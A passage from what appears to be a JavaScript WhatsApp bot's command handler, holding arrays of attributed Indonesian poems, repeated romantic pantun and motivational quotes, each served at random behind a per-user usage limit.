        "Sjarifuddin A. Ch. (l. 1950)\nSajak Orang Tua\n\n(1)\nAku telah menyaksikan sesuatu di balik bayangan bulan\nseseorang membungkuk mengukur bayangannya sendiri\ndan segalanya menjadi gemetar\nIa merayap di bawah kabut\npada jam 4 dinihari\npada tahun 1999 dalam perkiraan hitungan jari-jari\ntanggal, jam, hari, bulan, tahun, semuanya jungkir balik dlam obsesi\n\n(2)\nAku telah menyaksikan sesuatu di balik bayangan bulan\nsebuah tangan dan kaki merayap-rayap\nmeraung dalam sepi\nmenggonggong ke arah pintu\nmengorek tanah dingin\nmenemukan tulangnya sendiri\nini sebuah bukti! \nketika ia mampu melawannya.\n\n 1974\n\nSumber: Penyair Muda di depan Mimbar (DKJ, 1976)\n\n",
        "Djamil Suherman (1924-1985)\nLagu Tanah Air\n\nI.\nKami yang lahir di sini lahirlah penyair dengan cinta\ndan harapannya\noleh air matari dan angin gunung\nKami yang besar di sini datanglah musafir dengan hati\ndan impiannya\noleh pasir laut sepanjang musim\nTanah ibu berbukit-bukit\nlembah hijau danau bening\npantulan segala cahya di pagi hening\n\nKami mukim di sini di segala musim\nmembajak sawah di musim basah\nmengetam padi – datangkah ia senja nanti?\no, mengemis selalu padiku dirangkum biru langit\nbila kemarau datang pergilah kalian ke balik bukit\nbertanam ubi, bertegal jagung memetik buah palam\ndi senja mendatang tiuplah suling o, gembalaku sayang\nhiba hatiku rindu nelayan kampung halaman\nrindu petualang kekasih tak pulang\no, angin lembah duta sekalian yang menunggu\nbersilir dengan suara merisik\nmenguasai lembah dan hati\n\nKami yang merenung di sini mencium senja di pasang laut\nmelepas pandang, kembangkan layar lautnya hijau\nkemerdekaanlah nyanyi kami berelung tangis\nantara kelam duka hati malam gerimis\nmerekam segala peristiwa dukacita siang malam\ncinta kami sepi\nsepi kami rindu\nkamilah itu, bapa kami nelayan tua berkulit coklat\nibu kami perawan jaya piala kasih dan airmata\nkamilah itu, yang kini tahu rahasia seberang\ndibaliklah kelam cinta kami sedang berkembang\n\nII.\n\nbuat Kirdjomuljo\n\nKami yang sebagian dari bumi dan air\nmembuat musim musim kehidupan kami\ndengan tanahliat, asap dan cinta\nmengembangkan tangan lantang berseru:\ndatanglah kalian ke humaku\nke danau kami kerajaan embun \nkami tumbuhkan segala tumbuhan untukmu\ncinta dan harapan – gembala kami adalah ia\npenghalau kemiskinan dan dosa\ndatanglah ke musim kami penuh setia\nkarena kami sebagian dari ibu kami\nperawan jaya piala kasih dan airmata\n\nIII.\n\nKami, kamilah itu yang jalan gontai di bawah angin\nbila gelap tiba dan udara jadi dingin\nmalamnya lagu kelu udara kelam menyelimut\nmelindungi anak kami hangat, membuat api\nmengharap segera pagi tiba bercahya kuning\nmencari kehidupan\n\nKamilah itu yang jalan gontai di tepi tanggul\nbila musim hujan tiba membasah tanah mandul\nmembendung air, tegal, kolam sawah dan perigi\nberbenam lumpur, sebarkan benih buat siapa yang tiba\ndatanglah hasratmu padanya\n\nKamilah itu yang semalam menantang angin\ndengan lampu di tangan kembangkan layar lautan pasang\nmusim ikan adalah punya kami\n\nKami, kamilah itu yang jalan atas matari dan kembang malam\nrumah kami bambu, tanah liat, di latar penuh melati\nkami bertembang tiap sore lagu lagu keabadian\nmengirim sesaji di laut dan di tikung jalan\nuntuk kami, datu-datu, lesung keramaian kampung halaman.\n\n\nIV\n\nbuat T.S. Bachtiar\n\nDamailah tanahair\nmancurlah mataair\nmembasmi kehidupan\n\nKemerdekaanlah maka laut, penyair dan harapan\nmengembang di danau hati ungu warnanya\nrindulah aku kepadanya\n\nKemerdekaanlah maka laut, lagu dan kenangan\nmambang di hikau kolam putih hatinya\nhadirlah aku karenanya\n\nKemerdekaanlah maka laut, tanahair dan kehidupan\nmatilah aku kesepian\n\nSumber: Kisah, No.2 Th. IV, Februari 1956 lewat Tonggak 1 (Gramedia, 1987)\n\n\n\n",
        "Wowok Hesti Prabowo (1963-2020)\nAnakku Memasak\n\nAnakku bermain pasaran\nMemasak masa depan dengan ramuannya\nPulau-pulau dari sendal jepit dan\npecahan genting\nBerjejer membentuk negeri. Ia terbang\nDari satu pulau ke pulau lainnya\nPesawat kertas mengantarkan harapannya\n\nAnakku menangis. Aku enggan\nberpura membelinya\nLantas ia makan sendiri masakannya. Sisa\nIa masukkan dalam buku pr\nEsok ia persembahkan pada bu gurunya.\n\nTangerang, 1994/1995\n\nSumber: Republika, Sabtu, 19 Oktober 1996 lewat Angkatan 2000 (Grasindo, 2020).\n\n",
        "Oei Sien Tjwan (l. 1947)\nBurung Jenjang Putih\n\ndi kota letih\nmulut terkunci gerimis pagi\nmatahari mengutuk kota\npenduduk berselimut rapat-rapat\ncuma ada beberapa burung – jenjang putih\nsayapnya mengepak-epak sedih\nke setiap jendela, ke setiap kota\naku semakin takut\nlampu sering mati\ndan hidup sendiri\nudara semakin putih\nmenyusupi selimut\nhijau tua\n\nJakarta 2000\n\nSumber: Hijau Kelon dan Puisi 2002 (Penerbit Buku Kompas, Jakarta, 2002)\n\n\n\n",
        "Goenawan Mohamad (l. 1941)\nPotret Taman untuk Allen Ginsberg\n\nIa menebak dari warna kulit saya\ndan berkata, ‘Tuan pasti dari dunia ke-3.’\nLalu ia, dari dunia pertama, mengunyah makan pagi\nseraya mengutip Mao Tse-tung\ndan sebuah sajak gunung – ramah sekali.\n\nBisakah ia tidur\nsebelum anggur\nlalu mungkin mimpi\ndi lindungan malaikat masehi?\n\nIa telah jalan dalam angin\ndan mengucup es-krim\ndan membaca berita di halaman pertama\ntentang sebuah perang\ndi Asia Tenggara\n\nIa kini duduk bersila\ndi bangku taman kotapraja\nmungkin semadi\nmungkin aku tidak mengerti\nkarena ia berkata:\n‘Di Vietnam tak ada orang mati’\nTak ada Vietnam dan Orang tak mati.’\n\nLalu ia mencari kepak burung\nia mencari merpati\nia mencari lambang\nia mencari makna hari.\nIa mencari seakan ia tahu apa yang ia\ningin temukan dan tiba-tiba ia menuliskan:\n\n‘Revolusi, Revolusi, Tak bisa Dipesan Hari Ini.’\nLalu ia bangkit ia mual ia mencium\nbau biasa dari kakus umum;\nia basah oleh tangis dan ia meludah:\n‘Kencingilah kaum borjuis!’\nAdakah ia Nabi?\n\nTuhan. Di taman ini orang juga ngelindur\ntentang perempuan-perempuan berpupur\ndan sebuah mulut berahi kudengar memaki:\n‘Bangsat, kenapa aku di sini!’\nAtau mungkin ia ngelindur tentang sebuah dusun\nyang hancur dan sisa infantri dan mayat\ndan ulat dan ruh dan matahari?\n\nAku dengar seorang-orang tua, yang kesal dan\nberkata: ‘Di sekitar hari Natal, pernah terjadi\nhal yang tak masuk akal. Misalnya mereka\nmembom Hanoi sebelum (bukan sesudah) aku minum\nkopi.’\n\n1973\n\nSumber: Asmaradana (Grasindo, 1992)\n\n\n\n",
        "Ghaida Setiana (l. 1995)\nMisteri Buntu Poirot dan Marple\n\n Untuk: Archibald Christie\n\nKiranya begini\nMenjadi sukses dengan jutaan buku laris manis\nMenjadi kaya raya dan berlibur ke ujung dunia\nBerbagai belasan tahun dengan orang yang sama\nTak mampu membuatmu tinggal\nAku hendak meminta bantuan pada Poirot dan Marple\nUntuk menyelidiki kemana hilangnya rasamu\nTapi mereka pun buntu\nKarena penciptanya saja tidak tahu\nAku tidak yakin\nApakah ia tertinggal di Australia atau Kanada?\nApakah ia dibunuh dokter, hakim, atau 12 orang di dalam kereta?\nAku menulis beribu misteri\nTapi hilang arah untuk persoalan ini\n\nMalam ini kuputuskan hilang\nMasuk ke dalam salah satu plot di bukuku\nMenjelma menjadi seorang wanita\nYang diam-diam membahagiakanmu\n\nSumber: Manuskrip Ghaida Setiana\n\n",
        "Oppa Rudi Fofid (l. 1964)\nSyair Orang Kampungan\n\nkami datang dari udik\nmama biang iris tali pusat kami\npakai sembilu\n\nkampung kami amat perawan\nmalaikat sering mandi\ndewa-dewi tamasya\n\nrimba raya, gunung mulia, sungai lagu, laut ajaib\nsemuanya hanyalah kamar-kamar\ntempat kami sederhanakan hidup\n\nkalau orang kota datang\nkami sambut bagai raja\nbarang dan jasa, semua cuma-cuma\n\nkami suka orang kota\nbaju, sepatu, tustel, pisau cukur\npomade, logat, semua itu pesona\nkalau orang kota pergi\nkami antar dengan air mata\nkami kenang mereka secara kaya raya\n\nbatin kami kenal dua kasta orang kota\nsatunya pembela dan pembina kami\nSatunya pecah-belah dan binasakan kami\n\nkami lugu tetapi orang kota itu lucu\nkalau kami ke kota, jadilah berita\nmereka tatap ujung kaki sampai ujung rambut kami\n\nkalau kami bicara dengan nada-nada kampung\nmereka tertawa geli sampai bertahun-tahun\nseakan lagu bahasa kami itu satu kesalahan budaya\n\nkami diperkenalkan pada kota\nbeginilah kota, kencing bayar, parkir bayar\nbeginilah kota, tidak ada mangga dan pepaya gratis\n\nbanyak orang kota berhati putih\nmereka inilah para pembela dan pembina kami\njika bertemu, mereka ingin gendong kami\n\ntidak sedikit orang kota berhati hitam\nmereka pecah-belah kami dan mau binasakan kami\njika bertemu, mereka ingin bius kami\n\nkami orang kampung kecil\ntetapi kami punya mimpi besar\nmaka kami belajar melihat dunia\n\nketika kami sanggup melihat ketidakadilan\nketika kami ikut protes dalam unjuk rasa\nkami diserang kata-kata payah: kampungan\n\ndulu, kami pernah sesali takdir\nmengapa lahir di udik\nbukankah itu abadi di akta kelahiran\nkini, setelah kami kenal dunia\nbarulah kami mengerti\nkampung kami adalah surga yang diperebutkan\n\nmaka atas nama tanah kami\natas nama nenek moyang kami\nkami akan kembali jadi anak kampung nan udik\n\nkami akan pergi ke batu baboso\nbicara dengan orang baboso-baboso\ndalam bahasa sirih, pinang, kapur, gobang\n\no penjaga tanah, penjaga rimba\npenjaga gunung, penjaga laut\nberpihaklah pada kesucian\n\njika ada orang ke kampung kami\nsambil lirik tanah kami dengan mata culas\nbawa dia ke kubur walau belum waktunya\nBaca Juga Ibrahim Ruray Menang Praperadilan\n\njika ada orang ke kampung kami\nsambil elus tanah kami dengan doa tulus\nantar dia ke pintu eden, pada waktunya\n\nkami datang dari udik\nmama biang iris tali pusat kami\npakai sembilu\nkami tahu, kami berdiri di garis tepi kesunyian\nkami telungkup di halaman belakang ketertinggalan\nkami sedang berjalan di jalan pincang ketidakadilan\n\nkami curahkan tetes-tetes syair kampungan ini\ndi atas daun-daun keladi dan daun-daun salam\ndi bawah pohon damar dan kenanga terakhir\n\nkami percaya, dari seribu anak kami yang ke kota\nkelak ada satu-dua anak kembali ke kampung\nmereka akan menjelma anak-anak baboso\n\ndi atas tanah-tanah baboso\norang kampung akan jaga isi tanah\nagar pohon seho terus tumbuh ke langit\n\ndari sana, orang kampung kirim rampa-rampa\npadi, ubi, sayur, kelapa, gula merah, ikan, ternak\nagar orang kota kenyang, bahagia, walau lupa kampung\n\ndari sana, orang kampung kirim kayu ke kota\nagar dibuatkan rumah kayu dan ranjang kayu\ntempat orang kota tinggal bulan madu, walau lupa kampung\n\nkami orang kampung\nsekali udik tetap udik\norang kota sebut kami kampungan, anjay!\n\nAmbon, 9 Oktober 2020\n\nSumber: Suara-suara dari Alifuru (Teras Budaya Jakarta, Jakarta, 2021); Poros\nTimur, 18 Oktober 2020.\n\n\n\n"
]
const puisi = puis[Math.floor(Math.random() * puis.length)]
m.reply(`${puisi}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'pantun': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const pant = [
"Air mawar di dalam cangkir\ndisimpan kendi di bawah parang\nSedari awal hinggalah akhir\nsayangku tercurah untukmu seorang",
"abangku ganteng\nNeng di sini setia menunggu",
"Buat sangkar harus pakai paku\nsebelum buat sangkar enaknya minum jamu\nTidak ada wanita lain di hatiku\nkarena hatiku hanya untukmu",
"Kamu Prancis aku Belgia\nKamu yang manis siapa yang punya ",
"Daging ayam dibuat gulai\nbuat dimakan kita nanti\nDirimu seorang yang ternilai\ntakkan pernah bisa diganti",
"Kau seperti sekuter matic\nyang sering dinaiki si Nita\nBagiku kau wanita cantik\nyang dapat membuat semua laki-laki jatuh cinta",
"Barang itu adalah barang yang antik\ntadi penjual barang antik tersebut datang kesini bertamu\nBerjuta-juta wanita yang cantik\ntiada wanita cantik selain dirimu",
"Ibu-ibu sukanya ngebatik\nkalau bapak-bapak sukanya rebana\nkau wanita yang paling cantik\nyang dapat membuatku terpana",
"selamat pagi\niya Kamu yang aku cinta  ",
"Api kecil dari tungku\napinya kecil habis kayu\nSudah lama kutunggu-tunggu\nkapan kamu bilang I love you",
"Bagaimana memanjat pohon randu?\nTangan di atas kaki ke hulu\nBagaimana hati tak rindu?\nPacarnya lembut suka melucu",
"Air mawar di dalam cangkir\ndisimpan kendi di bawah parang\nSedari awal hinggalah akhir\nsayangku tercurah untukmu seorang",
"Makan ayam lalapannya kemangi\ntetapi jangan lupa bersihin kuku\nTak ada wanita lain yang aku sayangi\nhanya kamulah wanita yang mengisi hatiku",
"Naik motor sama mama papa\npakainya motor matik\nEeee tadi aku pikir siapa\nTernyata adinda yang cantik",
"Udah bikin janji malah lupa\ntapi aku tidak akan lupa dengan cita-cita\nAku memang tidak bisa memberimu apa-apa\nkarena yang bisa ku beri hanya kasih sayang dan cinta",
"Jalan-jalan ke negara Inggris\nbanyak gedung berbaris-baris\nAku rela ditusuk ditusuk keris\ndemi cintakmu kepada Adinda yang manis",
"Punya istri cuma satu\ndia malah seorang penjual jamu\nAku ingin ungkapkan sesuatu\nyaitu aku ingin mendapatkan cinta yang tulus darimu",
"Jalanan lagi lancar\nitu adalah sebuah berkah\nAku bukan nyari pacar\ntapi nyari yang mau diajak nikah",
"Kemarin aku habis dilempar batu\nternyata yang nglembar batu itu ikan hiu\nSebenarnya aku ingin katakan sesuatu\nyaitu I love you",
"Ku ajak pergi ke pantai kau tidak mau\nsoalnya aku ingin berdua denganmu\nSaat ini yang perlu kau tau\nku tak bisa hidup tanpa dirimu\n ",
"Paling banyak burung gelatik\ndi atas terbang melayang\nMemang banyak wanita cantik\ncuma engkau yang aku sayang",
"Ada ayam ada itik\nBerjalan sambil mengangguk-angguk\nSelamat malam wanita cantik\nKenalan yuuk",
"Di semak ada kemumu\nHinggap di daun bunganya biru\nHai adek berjilbab biru\nHati tergerak ingin tahu namamu",
"Meski hanya sebuah jambu\ntetap bisa dibuat jamu\nMeski jarang kita bertemu\ncintaku tetap hanya untukmu",
"Makan nasi ditemani bakwan\nMinumnya dengan air susu\nWahai nona cantik rupawan\nBolehkan aku tahu namamu ? ",
"Sapu rumah hingga bersih\natapnya satu dibawa pergi\nTatap mataku wahai kekaih\ncintaku satu tak terbagi-bagi",
"Jauh-jauh ke Negeri Cina\nhanya untuk mencari ilmu\nNamamu saja sudah sangat mempesona\napalagi dengan senyummu ",
"Pergi ke sungai mandikan gajah\nGajah bersih di hari petang minggu\nAduhai manisnya kamu punya wajah\nBolehkan abang mengenal dirimu ? ",
"Nunggu angkot di belokan\nNaik angkot bertemu kamu\nIngin segera ku ungkapkan\nRasa cinta ini",
"Bagaimana memanjat pohon randu?\nTangan di atas kaki ke hulu\nBagaimana hati tak rindu?\nPacarnya lembut suka melucu",
"Peganglah kayu yang tak rapuh\nAgar sampai engkau ke tuju\nSebelum adik pergi menjauh\nLebih baik kita berkenalan dulu\n",
"Naruh uang di dalam saku\nsakunya sobek gara-gara kena kuku\nJangan sampai kau mengkhianatiku\nkarena hanya dirimu yang ada di hatiku",
"Patah dahan disambungkan\nhendak hati disatukan\nKepada Tuhan kita mohonkan\nagar cepat dipertemukan",
"Di Jam Gadang banyak Badut\nMembuat anak-anak jadi gembira\nPria mana yang tak terpincut\nIngin kenal denganmu sang jelita",
"Bawa rantang isinya nasi\nnasi dimakan dibagi rata\nBiarlah bintang yang menjadi saksi\nuntuk mengawali cinta kita ",
"Jikalau ikan di dalam kolam\nbunganya tumbuh di tengah taman\nJikalau cintaku sudah mendalam\njaraknya jauh tak ku hiraukan\n ",
"Buat sangkar harus pakai paku\nsebelum buat sangkar enaknya minum jamu\nTidak ada wanita lain di hatiku\nkarena hatiku hanya untukmu\n ",
"Laki-laki itu bukan saya\ntetapi itu adalah sahabatku\nBapak kamu seorang pencuri ya\nsoalnya kau telah mencuri hatiku\n ",
"Berlabuh orang menunggu\nhendak berlayar ke Siantar\nKalau jauh terasa rindu\njika berjumpa terasa sebentar\n ",
"Pagi-pagi enaknya makan roti\nkarena setelah itu harus pergi menuntut ilmu\nKamu jangan berkecil hati\nkarena hatiku hanya untukmu\n ",
"Bawa paku dipukul batu\ndicampur jamu di atas tungku\nCintaku cukuplah satu\nuntuk kamu sepanjang waktu\n ",
"Mengapa ada telaga\nkarena air yang mengisi\nMengapa ada cinta\njika dirimu tak dapat kumiliki ",
"Cinta itu bermula dari mata\ndan terkadang tertulis sampai ke buku\nKau bagaikan nelayan cinta\nyang selalu menebar benih-benih cinta di hatiku\n ",
"Ibu-ibu sukanya ngebatik\nkalau bapak-bapak sukanya rebana\nkau wanita yang paling cantik\nyang dapat membuatku terpana\n ",
"Jalan-jalan ke Ciamis\nKangan lupa membeli Rambutan\nUntuk adinda yang berwajah manis\nBolehkah abang kenalan ? ",
"Aceh terkenal si Bungong Jeumpa\nDijadikan pengiring Tari Saman\nAdik cantik siapa yang punya\nBolehkan kita untuk berkenalan ? ",
"Buah salak buah delima\nAda banyak wanita cantik hanya Kamu yang aku cinta ",
"Kamu Prancis aku Belgia\nKamu yang manis siapa yang punya ",
"Orang itu bukanlah hantu\ntapi orang itu adalah tamu\nAku ingin menjadi kunci pintu\nsupaya aku dapat membuka pintu hatimu\n ",
"Kalau nembak cewek jangan pakai senapan\nberilah dia buah duren\nAku memang bukan orang yang tampan\ntetapi aku imut-imut dan keren",
"Makan ayam lalapannya kemangi\ntetapi jangan lupa bersihin kuku\nTak ada wanita lain yang aku sayangi\nhanya kamulah wanita yang mengisi hatiku",
"Ayam goreng setengah mateng\nbelinya di depan tugu\nAbang sayang, abangku ganteng\nNeng di sini setia menunggu",
"Air mawar di dalam cangkir\ndisimpan kendi di bawah parang\nSedari awal hinggalah akhir\nsayangku tercurah untukmu seorang",
"Udah bikin janji malah lupa\ntapi aku tidak akan lupa dengan cita-cita\nAku memang tidak bisa memberimu apa-apa\nkarena yang bisa ku beri hanya kasih sayang dan cinta",
"Aku itu sulit dalam menghafal\nsoalnya aku males baca buku\nKau bagaikan sebuah kapal\nyang berlabuh di hatiku",
"Langit biru terlihat sendu\nwarna hijau biru dan semu\nJarak jauh tumbuhkan rindu\ningin selalu dekat denganmu",
"Waktu daftar hari terakhir\nwaktu terasa banyak terbuang\nKamu nggak perlu khawatir\ncintaku hanya untukmu seorang",
"Peganglah kayu yang tak rapuh\nAgar sampai engkau ke tuju\nSebelum adik pergi menjauh\nLebih baik kita berkenalan dulu\n",
"Bunga mawar tangkai berduri\nLaris manis pedang cendol\nAku tersenyum malu sekali\nIngat dulu suka mengompol",
"Sapu rumah hingga bersih\natapnya satu dibawa pergi\nTatap mataku wahai kekaih\ncintaku satu tak terbagi-bagi",
"Orang itu bukanlah hantu\ntapi orang itu adalah tamu\nAku ingin menjadi kunci pintu\nsupaya aku dapat membuka pintu hatimu",
"Gula pasir lebih manis gula jawa\nbuah mahoni lebih pahit dari jamu\nHatiku ini takkan mendua\nkarena hati ini telah jadi milikmu",
"Api kecil dari tungku\napinya kecil habis kayu\nSudah lama kutunggu-tunggu\nkapan kamu bilang I love you",
"Jalan-jalan pakai motor matik\nsambil bawa bekal telur dadar\nKau hari ini tampak begitu cantik\nsampai melebihi Jesika Iskandar",
"Buat sangkar harus pakai paku\nsebelum buat sangkar enaknya minum jamu\nTidak ada wanita lain di hatiku\nkarena hatiku hanya untukmu",
"Cinta itu bermula dari mata\ndan terkadang tertulis sampai ke buku\nKau bagaikan nelayan cinta\nyang selalu menebar benih-benih cinta di hatiku",
"Minum sekoteng hangat rasanya\nminum segelas ada yang minta\nLaki-laki ganteng siapa yang punya?\nBolehkah aku jatuh cinta",
"Rajin olahraga bikin tubuh sehat\njangan lupa sarapan dulu\nbangun pagi sungguh semangat\nkalau ingat senyum manismu ",
"Makan soto di Surabaya\nkalau jomblo boleh kenalan nggak ya ",
"Aceh terkenal si Bungong Jeumpa\nDijadikan pengiring Tari Saman\nAdik cantik siapa yang punya\nBolehkan kita untuk berkenalan ? ",
"Buah salak buah delima\nAda banyak wanita cantik hanya Kamu yang aku cinta ",
"Ku ajak pergi ke pantai kau tidak mau\nsoalnya aku ingin berdua denganmu\nSaat ini yang perlu kau tau\nku tak bisa hidup tanpa dirimu",
"Pagi-pagi enaknya makan roti\nkarena setelah itu harus pergi menuntut ilmu\nKamu jangan berkecil hati\nkarena hatiku hanya untukmu",
"Patah dahan disambungkan\nhendak hati disatukan\nKepada Tuhan kita mohonkan\nagar cepat dipertemukan",
"Kemarin aku habis dilempar batu\nternyata yang nglembar batu itu ikan hiu\nSebenarnya aku ingin katakan sesuatu\nyaitu I love you",
"Makan ayam lalapannya kemangi\ntetapi jangan lupa bersihin kuku\nTak ada wanita lain yang aku sayangi\nhanya kamulah wanita yang mengisi hatiku",
"Udah bikin janji malah lupa\ntapi aku tidak akan lupa dengan cita-cita\nAku memang tidak bisa memberimu apa-apa\nkarena yang bisa ku beri hanya kasih sayang dan cinta",
"Sebelum Adzan Tabuh di pukul\nMarilah shalat perbanyak amal\nUntuk kamu bergigi gingsul\nHati bergejolak ingin mengenal",
"Makan ayam lalapannya kemangi\ntetapi jangan lupa bersihin kuku\nTak ada wanita lain yang aku sayangi\nhanya kamulah wanita yang mengisi hatiku",
"Punya istri cuma satu\ndia malah seorang penjual jamu\nAku ingin ungkapkan sesuatu\nyaitu aku ingin mendapatkan cinta yang tulus darimu",
"Seribu bebek di kandang singa\nhanya satu berwarna belang\nBeribu cewek di Indonesia\nhanya engkau yang aku sayang",
"Hobiku itu menyelam\nketika menyelam pasti aku mengajak teman minimal satu\nAku ingin sekali kamu tenggelam\ntenggelam di dalam hatiku",
"Patah dahan disambungkan\nhendak hati disatukan\nKepada Tuhan kita mohonkan\nagar cepat dipertemukan",
"Jilbab putih dan abu-abu\nDipakai dengan indahnya gamis\nBolehkah ku tahu namamu\nUntuk kamu yang senyumnya manis",
"Buah salak buah duku\ntidak bisa dibuat jamu\nBila kau belah dadaku\nakan kau temukan tulisan namamu",
"Daging ayam dibuat gulai\nbuat dimakan kita nanti\nDirimu seorang yang ternilai\ntakkan pernah bisa diganti",
"Ibu-ibu sukanya ngebatik\nkalau bapak-bapak sukanya rebana\nkau wanita yang paling cantik\nyang dapat membuatku terpana",
"Hobiku itu menyelam\nketika menyelam pasti aku mengajak teman minimal satu\nAku ingin sekali kamu tenggelam\ntenggelam di dalam hatiku",
"Di semak ada kemumu\nHinggap di daun bunganya biru\nHai adek berjilbab biru\nHati tergerak ingin tahu namamu",
"Sabtu pagi beli pasta gigi\nlalu siangnya beli kacamata\nHey Kamu",
"Buah salak buah duku\ntidak bisa dibuat jamu\nBila kau belah dadaku\nakan kau temukan tulisan namamu",
"Ku ajak pergi ke pantai kau tidak mau\nsoalnya aku ingin berdua denganmu\nSaat ini yang perlu kau tau\nku tak bisa hidup tanpa dirimu",
"Beli kain warnanya merah\ndari kediri pakainya batik\ndigodain jangan marah\nsalah sendiri punya wajah cantik ",
"Buah salak buah duku\ntidak bisa dibuat jamu\nBila kau belah dadaku\nakan kau temukan tulisan namamu",
"Buah salak buah delima\nAda banyak wanita cantik hanya Kamu yang aku cinta ",
"Kau seperti sekuter matic\nyang sering dinaiki si Nita\nBagiku kau wanita cantik\nyang dapat membuat semua laki-laki jatuh cinta ",
"Air arak diharamkan\nkarenanya banyak nyawa melayang\nMeskipun jarak memisahkan\nsemua itu bukan penghalang",
"Kemarin aku habis dilempar batu\nternyata yang nglembar batu itu ikan hiu\nSebenarnya aku ingin katakan sesuatu\nyaitu I love you",
"Udah bikin janji malah lupa\ntapi aku tidak akan lupa dengan cita-cita\nAku memang tidak bisa memberimu apa-apa\nkarena yang bisa ku beri hanya kasih sayang dan cinta",
"Jalanan lagi lancar\nitu adalah sebuah berkah\nAku bukan nyari pacar\ntapi nyari yang mau diajak nikah",
"Jilbab putih dan abu-abu\nDipakai dengan indahnya gamis\nBolehkah ku tahu namamu\nUntuk kamu yang senyumnya manis",
"Hobiku itu menyelam\nketika menyelam pasti aku mengajak teman minimal satu\nAku ingin sekali kamu tenggelam\ntenggelam di dalam hatiku",
"Langit biru terlihat sendu\nwarna hijau biru dan semu\nJarak jauh tumbuhkan rindu\ningin selalu dekat denganmu",
"Jauh-jauh ke Negeri Cina\nhanya untuk mencari ilmu\nNamamu saja sudah sangat mempesona\napalagi dengan senyummu ",
"Sabtu pagi beli pasta gigi\nlalu siangnya beli kacamata\nHey Kamu",
"Ada ayam ada itik\nBerjalan sambil mengangguk-angguk\nSelamat malam wanita cantik\nKenalan yuuk",
"Kalau nembak cewek jangan pakai senapan\nberilah dia buah duren\nAku memang bukan orang yang tampan\ntetapi aku imut-imut dan keren",
"Rendah terbangnya si kupu-kupu\nHinggap tenang di tali jemuran\nHati tergerak mulut malu\nKarena ingin sekali berkenalan ",
"Makan ayam lalapannya kemangi\ntetapi jangan lupa bersihin kuku\nTak ada wanita lain yang aku sayangi\nhanya kamulah wanita yang mengisi hatiku",
"Ayam goreng setengah mateng\nbelinya di depan tugu\nAbang sayang",
"Naik motor sama mama papa\npakainya motor matik\nEeee tadi aku pikir siapa\nTernyata adinda yang cantik"
]
const pantun = pant[Math.floor(Math.random() * pant.length)]
m.reply(`${pantun}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'motivasi': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const motiv = [
  "Kesempatan itu mirip seperti matahari terbit. Kalau kau menunggu terlalu lama, kau bisa melewatkannya",
  "Kegagalan dibuat hanya oleh mereka yang gagal untuk berani, bukan oleh mereka yang berani gagal",
  "Disiplin adalah jembatan antara tujuan dan pencapaian",
  "Lebih baik gagal dalam orisinalitas daripada berhasil meniru",
  "Disiplin adalah jembatan antara tujuan dan pencapaian",
  "Sukses tampaknya terkait dengan tindakan. Orang sukses terus bergerak. Mereka membuat kesalahan, tetapi mereka tidak berhenti",
  "Keberanian adalah penolakan terhadap rasa takut, penguasaan rasa takut, bukan ketiadaan rasa takut",
  "Sukses tampaknya terkait dengan tindakan. Orang sukses terus bergerak. Mereka membuat kesalahan, tetapi mereka tidak berhenti",
  "Hidup kita mulai berakhir saat kita menjadi diam tentang hal-hal yang penting",
  "Kesempatan itu mirip seperti matahari terbit. Kalau kau menunggu terlalu lama, kau bisa melewatkannya",
  "Kegagalan dibuat hanya oleh mereka yang gagal untuk berani, bukan oleh mereka yang berani gagal",
  "Lakukan apa yang harus kamu lakukan sampai kamu dapat melakukan apa yang ingin kamu lakukan",
  "Keberanian adalah penolakan terhadap rasa takut, penguasaan rasa takut, bukan ketiadaan rasa takut",
  "Kegagalan dibuat hanya oleh mereka yang gagal untuk berani, bukan oleh mereka yang berani gagal",
  "Penghargaan paling tinggi bagi seorang pekerja keras bukanlah apa yang dia peroleh dari pekerjaan itu, tapi seberapa berkembang ia dengan kerja kerasnya itu",
  "Jangan tunda pekerjaanmu sampai besok, sementara kau bisa mengerjakannya hari ini",
  "Saya tidak bisa memberimu rumus untuk sukses, tapi saya bisa memberi rumus untuk gagal, yaitu: cobalah untuk menyenangkan semua orang",
  "Sukses adalah tempat persiapan dan kesempatan bertemu",
  "Disiplin adalah jembatan antara tujuan dan pencapaian",
  "Tetapkan tujuan Anda tinggi-tinggi, dan jangan berhenti sampai Anda mencapainya",
  "Hidup kita mulai berakhir saat kita menjadi diam tentang hal-hal yang penting",
  "Tetapkan tujuan Anda tinggi-tinggi, dan jangan berhenti sampai Anda mencapainya",
  "Daripada mengeluh tentang keadaanmu, sibuklah dan buat beberapa yang baru",
  "Orang pesimis melihat kesulitan di setiap kesempatan. Orang yang optimis melihat peluang dalam setiap kesulitan",
  "Sukses tampaknya terkait dengan tindakan. Orang sukses terus bergerak. Mereka membuat kesalahan, tetapi mereka tidak berhenti",
  "Saya tidak bisa memberimu rumus untuk sukses, tapi saya bisa memberi rumus untuk gagal, yaitu: cobalah untuk menyenangkan semua orang",
  "Tetapkan tujuan Anda tinggi-tinggi, dan jangan berhenti sampai Anda mencapainya",
  "Hidup kita mulai berakhir saat kita menjadi diam tentang hal-hal yang penting",
  "Jika rencananya tidak berhasil, ubah rencananya bukan tujuannya",
  "Saya tidak bisa memberimu rumus untuk sukses, tapi saya bisa memberi rumus untuk gagal, yaitu: cobalah untuk menyenangkan semua orang",
  "Daripada mengeluh tentang keadaanmu, sibuklah dan buat beberapa yang baru",
  "Pengalaman adalah guru yang berat karena dia memberikan tes terlebih dahulu, kemudian pelajarannya",
  "Cara terbaik untuk memulai adalah dengan berhenti berbicara dan mulai melakukan",
  "Jenius adalah satu persen inspirasi dan sembilan puluh sembilan persen keringat",
  "Jangan biarkan kemarin menyita terlalu banyak hari ini",
  "Penghargaan paling tinggi bagi seorang pekerja keras bukanlah apa yang dia peroleh dari pekerjaan itu, tapi seberapa berkembang ia dengan kerja kerasnya itu",
  "Tetapkan tujuan Anda tinggi-tinggi, dan jangan berhenti sampai Anda mencapainya",
  "Jika saya punya waktu enam jam untuk menebang pohon, saya akan menghabiskan empat jam pertama mengasah kapak",
  "Jangan tunda pekerjaanmu sampai besok, sementara kau bisa mengerjakannya hari ini",
